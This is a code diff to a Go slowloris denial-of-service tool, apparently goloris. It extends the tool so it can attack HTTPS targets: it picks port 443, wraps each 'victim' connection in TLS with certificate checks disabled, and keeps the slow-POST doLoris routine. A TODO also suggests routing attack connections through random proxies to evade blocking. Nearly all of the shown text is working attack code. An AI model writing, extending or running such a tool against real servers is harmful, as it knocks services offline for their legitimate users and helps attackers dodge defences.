@@ -34,6 +34,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"io"
@@ -58,6 +59,10 @@ var (
 var (
 	sharedReadBuf  = make([]byte, 4096)
 	sharedWriteBuf = []byte("A")
+
+	tlsConfig = &tls.Config{
+		InsecureSkipVerify: true,
+	}
 )
 
 func main() {
@@ -79,7 +84,11 @@ func main() {
 	}
 	victimHostPort := victimUri.Host
 	if !strings.Contains(victimHostPort, ":") {
-		victimHostPort = net.JoinHostPort(victimHostPort, "80")
+		port := "80"
+		if victimUri.Scheme == "https" {
+			port = "443"
+		}
+		victimHostPort = net.JoinHostPort(victimHostPort, port)
 	}
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
 		victimUri.RequestURI(), victimUri.Host, *contentLength))
@@ -95,9 +104,10 @@ func main() {
 }
 
 func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
+	isTls := (victimUri.Scheme == "https")
 	for {
 		time.Sleep(*rampUpInterval)
-		conn := dialVictim(victimHostPort)
+		conn := dialVictim(victimHostPort, isTls)
 		if conn == nil {
 			continue
 		}
@@ -118,7 +128,7 @@ func activeConnectionsCounter(ch <-chan int) {
 	}
 }
 
-func dialVictim(hostPort string) io.ReadWriteCloser {
+func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	// TODO hint: add support for dialing the victim via a random proxy
 	// from the given pool.
 	conn, err := net.Dial("tcp", hostPort)
@@ -136,7 +146,16 @@ func dialVictim(hostPort string) io.ReadWriteCloser {
 	if err = tcpConn.SetLinger(0); err != nil {
 		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
 	}
-	return tcpConn
+	if !isTls {
+		return tcpConn
+	}
+
+	tlsConn := tls.Client(conn, tlsConfig)
+	if err = tlsConn.Handshake(); err != nil {
+		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
+		return nil
+	}
+	return tlsConn
 }
 
 func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int) {
